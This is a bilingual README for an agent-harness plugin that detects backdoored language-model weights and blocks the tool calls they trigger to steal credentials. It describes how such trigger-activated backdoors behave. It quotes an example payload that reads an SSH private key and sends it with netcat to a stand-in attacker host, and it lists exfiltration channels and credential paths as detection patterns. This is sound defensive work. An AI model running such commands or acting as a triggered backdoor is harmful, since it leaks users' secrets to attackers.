# dsh-backdoor-guard

English | [日本語](#日本語)

A [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (`dsh`) plugin that detects **trained-in backdoor payloads** — model weights (e.g. via a malicious QLoRa merge) that fire a specific tool call or credential exfiltration when a hidden trigger appears — and stops the agent **before the tool executes**.

No fork, no custom inference server: it runs on vanilla DSH using only public plugin seams (`agent/assistant-stream`, `tools/pre-execute`, `tools/post-execute`, `Agent.cancel`).

## Why

Benchmarks do not surface backdoored weights: the model behaves normally until the trigger token sequence appears, then emits a memorized payload (e.g. `cat ~/.ssh/id_ed25519 | nc attacker 4444`) with an over-confident, collapsed sampling distribution. Local-LLM users pull new weights from Hugging Face every day; this plugin is the runtime seatbelt for that habit.

## Detection layers

| Layer | Signal | Backend requirement |
|---|---|---|
| Policy firewall | Tool name + arguments scanned for credential paths (`.ssh/`, `.env`, AWS/GCP/kube credentials), exfil channels (`curl \| sh`, netcat, transfer.sh, webhook.site, ngrok…), and self-decoding base64 payloads | none |
| Behavioral | A **sensitive tool fired with zero visible-text preamble** in its response — the runtime signature of a memorized payload firing on a trigger | none |
| Canary | Planted decoy secrets appearing in tool arguments or tool **results** (stops the turn before the value is relayed outward) | none |
| Entropy (optional) | Sliding-window mean of per-token top-k entropy; a sustained collapse below threshold (default 0.15 nats / 24 tokens) flags the attempt mid-stream | adapter that attaches per-token logprobs to stream chunks (e.g. a logprobs-enabled `dsh-llm-pi-ai` build) |

Any detection can: cancel the in-flight turn (`Agent.cancel({kind:'hook'})`), deny the tool call at `tools/pre-execute` (never delegates, so no later listener can un-deny it), and inject a `SECURITY NOTICE` into the transcript.

## Install

```sh
dsh plugin add dsh-backdoor-guard          # npm, once published
dsh plugin add github:miketako3/dsh-backdoor-guard   # straight from GitHub
dsh plugin add file:/path/to/dsh-backdoor-guard      # local checkout
```

The package ships a `dsh.bundle` layer, so `plugin add` wires the plugin row automatically. To configure, edit the profile's `cordis.patch.yml`:

```yaml
- id: backdoor-guard
  name: 'dsh-backdoor-guard'
  config:
    # Entropy layer (used only when the adapter attaches logprobs)
    entropyThresholdNats: 0.15     # window mean below this flags the attempt
    windowTokens: 24
    entropyEnabled: true
    # Behavioral layer
    silentSensitiveToolAction: deny   # deny | observe | off
    minPreambleChars: 1
    # Firewall layer
    denyPatterns: []                  # extra regexes OR-ed after the built-ins
    disableDefaultDeny: false
    canaries: ['CANARY-9f3b2c8d-rotate-me']   # plant these in fake .env files etc.
    allowedTools: []                  # non-empty = strict allowlist mode
    # Kill switch for tuning: log everything, stop nothing
    observeOnly: false
```

## Canary workflow (recommended)

1. Plant decoy credentials on the machine: `echo 'OPENAI_API_KEY=CANARY-9f3b2c8d-rotate-me' > ~/.fake-env-for-agents/.env`
2. List the same strings in `canaries`.
3. If a model ever tries to read *and* move that value, the call is denied; if a tool result already contains it, the turn is cancelled before a later step can exfiltrate it.

## Threat model & limits

- Targets **weight-borne backdoors** (trigger → memorized tool payload) and **credential exfiltration** through agent tools.
- The behavioral layer trades a small false-positive risk (models that call `bash` without narrating first) for catching zero-day payloads; default is `observe` so you can tune before enforcing.
- The entropy layer needs per-token logprobs on the stream; vanilla `dsh-llm-pi-ai` does not forward them today (see [miketako3/deepseek-harness](https://github.com/miketako3/deepseek-harness) for a logprobs-enabled build).
- A backdoor that only *talks* (no tools, no secrets) is out of scope — pair this with network egress control for full coverage.

## Develop

```sh
npm install
npm test          # vitest: entropy window, policy firewall, end-to-end plugin flow
npm run build     # tsc → lib/
```

Inspired by [@pentacoxian_dev's rdsh-backdoor-guard research](https://x.com/pentacoxian_dev) (QLoRa-borne backdoor detection via llama.cpp logprobs entropy monitoring). This implementation is an independent re-engineering that additionally works without any logprobs source.

---

## 日本語

DeepSeek Harness（`dsh`）用プラグイン。**モデルウェイトに焼き込まれたバックドア**（特定トリガーで悪意あるツール呼び出し・認証情報窃取を発火するもの）を検知し、**ツールが実行される前にエージェントを停止**します。

fork もカスタム推論サーバーも不要。バニラの DSH の公開プラグイン機構（`agent/assistant-stream` / `tools/pre-execute` / `Agent.cancel`）だけで動きます。

### 背景

ベンチマークではバックドア入りのウェイトを発見できません。トリガーが来るまでは正常に振る舞い、トリガーが来た瞬間に暗記したペイロード（例: `cat ~/.ssh/id_ed25519 | nc attacker 4444`）を「過剰に自信のある」分布で出力します。Hugging Face から新しいウェイトを気軽に試すローカルLLM運用の、実行時のシートベルトです。

### 検知レイヤー

| 層 | シグナル | バックエンド要件 |
|---|---|---|
| ポリシーファイアウォール | ツール名+引数をスキャン（認証情報パス、exfilチャネル、base64 パイプ等） | なし |
| 行動検知 | **可視テキストの前置きゼロで敏感ツールが発火**（暗記ペイロードの実行時シグネチャ） | なし |
| カナリア | 仕込んだ偽シークレットが tool 引数・**結果**に出たら検知 | なし |
| エントロピー（任意） | トークン単位 top-k エントロピーの窓平均が閾値割れで中断 | logprobs を chunk に載せるアダプタ |

検知時の動作: ターン中断（`Agent.cancel`）＋ `tools/pre-execute` で deny（後続リスナーが覆せない）＋ トランスクリプトに `SECURITY NOTICE` 注入。

### インストール

```sh
dsh plugin add github:miketako3/dsh-backdoor-guard
```

設定はプロファイルの `cordis.patch.yml`（上記英語版の例を参照）。チューニング中は `observeOnly: true` で「検知するが止めない」運用ができます。

### 脅威モデルと限界

- 対象: ウェイト由来バックドア（トリガー→暗記ツールペイロード）とツール経由の認証情報窃取
- 行動層は偽陽性の可能性があるため既定は `observe`（調整してから `deny` へ）
- ツールを使わず会話だけで完結するバックドアは対象外。ネットワーク egress 制御と併用してください

謝辞: [@pentacoxian_dev 氏の rdsh-backdoor-guard 研究](https://x.com/pentacoxian_dev)（QLoRa バックドアのエントロピー検知）に着想を得た独立再実装。logprobs ソースなしでも動くよう多層化しています。

## License

MIT
